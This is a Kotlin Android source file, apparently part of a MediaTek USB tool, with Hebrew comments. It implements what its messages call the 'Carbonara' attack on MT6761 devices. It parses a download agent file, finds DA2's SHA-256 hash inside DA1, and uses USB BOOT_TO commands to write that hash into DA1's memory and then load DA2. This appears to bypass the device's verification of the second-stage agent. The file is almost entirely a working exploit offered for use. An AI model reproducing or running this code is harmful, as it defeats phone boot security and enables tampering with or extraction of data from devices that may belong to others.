package com.example.mtkusbtool

import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbManager
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.security.MessageDigest
import java.util.Locale

object MtkBromConnection {

    data class DaRegion(val buf: Int, val len: Int, val addr: Long, val offset: Int, val sigLen: Int)
    data class DaParts(val da1: ByteArray, val da1Addr: Long, val da2: ByteArray, val da2Addr: Long)

    private fun indexOf(haystack: ByteArray, needle: ByteArray): Int {
        if (needle.isEmpty() || haystack.size < needle.size) return -1
        outer@ for (i in 0..haystack.size - needle.size) {
            for (j in needle.indices) {
                if (haystack[i + j] != needle[j]) continue@outer
            }
            return i
        }
        return -1
    }

    // פירוס ה-DA (מבוסס על הניסיונות הקודמים)
    private fun parseDa(data: ByteArray, onProgress: (String) -> Unit): DaParts? {
        val magic = "MTK_DOWNLOAD_AGENT".toByteArray()
        if (indexOf(data, magic) == -1) { onProgress("!! לא נמצא MTK_DOWNLOAD_AGENT"); return null }
        
        // חיפוש hwcode 0x717 (MT6761)
        val target = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(0x717).array()
        var off = -1
        outer@ for (i in 0..data.size - 4) {
            for (j in 0..3) { if (data[i + j] != target[j]) continue@outer }
            off = i; break
        }
        if (off == -1) { onProgress("!! לא נמצא hwcode 0x717"); return null }
        
        // קריאת 12 הבייטים של הרשומה
        val buf = ByteBuffer.wrap(data, off, 12).order(ByteOrder.LITTLE_ENDIAN)
        buf.short // magic
        buf.short // hwcode
        buf.short // subcode
        buf.short // hwver
        buf.short // swver
        val numRegions = buf.short.toInt() and 0xFFFF
        
        val regions = mutableListOf<DaRegion>()
        var rOff = off + 12
        for (i in 0 until numRegions) {
            if (rOff + 20 > data.size) break
            val rb = ByteBuffer.wrap(data, rOff, 20).order(ByteOrder.LITTLE_ENDIAN)
            regions.add(DaRegion(rb.int, rb.int, rb.int.toLong() and 0xFFFFFFFFL, rb.int, rb.int))
            rOff += 20
        }
        
        if (regions.size >= 3) {
            val da1 = regions[1]; val da2 = regions[2]
            onProgress("DA1: offset=0x${Integer.toHexString(da1.offset)}, len=${da1.len}, addr=0x${java.lang.Long.toHexString(da1.addr)}")
            onProgress("DA2: offset=0x${Integer.toHexString(da2.offset)}, len=${da2.len}, addr=0x${java.lang.Long.toHexString(da2.addr)}")
            
            if (da1.offset + da1.len <= data.size && da2.offset + da2.len <= data.size) {
                return DaParts(
                    data.copyOfRange(da1.offset, da1.offset + da1.len), da1.addr,
                    data.copyOfRange(da2.offset, da2.offset + da2.len), da2.addr
                )
            }
        }
        onProgress("!! פירוס נכשל")
        return null
    }

    // שליחת פקודת BOOT_TO (0xD5) עם כתובת ונתונים
    private fun bootTo(connection: UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, addr: Long, data: ByteArray): Boolean {
        if (connection.bulkTransfer(epOut, byteArrayOf(0xD5.toByte()), 1, 2000) < 0) return false
        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(addr.toInt()).array()
        if (connection.bulkTransfer(epOut, addrBytes, 4, 2000) < 0) return false
        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(data.size).array()
        if (connection.bulkTransfer(epOut, sizeBytes, 4, 2000) < 0) return false
        if (connection.bulkTransfer(epOut, data, data.size, 5000) < 0) return false
        val ack = ByteArray(2)
        connection.bulkTransfer(epIn, ack, 2, 2000)
        return true
    }

    fun runCarbonara(
        usbManager: UsbManager,
        device: UsbDevice,
        daBytes: ByteArray,
        onProgress: (String) -> Unit
    ): String {
        val connection = usbManager.openDevice(device) ?: return "שגיאה: פתיחת חיבור נכשלה."
        var epIn: UsbEndpoint? = null; var epOut: UsbEndpoint? = null
        for (i in 0 until device.interfaceCount) {
            val itf = device.getInterface(i)
            if (connection.claimInterface(itf, true)) {
                for (j in 0 until itf.endpointCount) {
                    val ep = itf.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep else epOut = ep
                    }
                }
                if (epIn != null && epOut != null) break
            }
        }
        if (epIn == null || epOut == null) { connection.close(); return "שגיאה: endpoints." }
        val inEp = epIn; val outEp = epOut

        // 1. פירוס
        onProgress("=== שלב 1: פירוס ה-DA ===")
        val parts = parseDa(daBytes, onProgress) ?: run { connection.close(); return "פירוס נכשל." }

        // 2. חישוב hash
        onProgress("=== שלב 2: חישוב hash ===")
        val hash = MessageDigest.getInstance("SHA-256").digest(parts.da2)
        onProgress("SHA-256 של DA2: ${hash.joinToString("") { String.format(Locale.US, "%02x", it) }}")
        
        // חיפוש ה-hash בתוך DA1 כדי למצוא את הכתובת
        val hashOffset = indexOf(parts.da1, hash)
        if (hashOffset == -1) {
            onProgress("!! לא נמצא hash של DA2 בתוך DA1. ייתכן שה-DA1 מתוקן.")
            connection.close(); return "Carbonara לא ריאלית."
        }
        onProgress("נמצא hash ב-offset 0x${Integer.toHexString(hashOffset)} בתוך DA1")

        // 3. שליחת ה-hash לכתובתו ב-DA1
        onProgress("=== שלב 3: שליחת hash ===")
        val hashAddr = parts.da1Addr + hashOffset
        if (!bootTo(connection, outEp, inEp, hashAddr, hash)) { connection.close(); return "שליחת hash נכשלה." }
        onProgress("hash נשלח בהצלחה!")

        // 4. שליחת ה-DA2
        onProgress("=== שלב 4: שליחת DA2 ===")
        if (!bootTo(connection, outEp, inEp, parts.da2Addr, parts.da2)) { connection.close(); return "שליחת DA2 נכשלה." }
        onProgress("DA2 נשלח בהצלחה!")

        connection.close()
        return "הצלחה!!! Carbonara הורצה. ה-DA2 אמור לרוץ."
    }
}
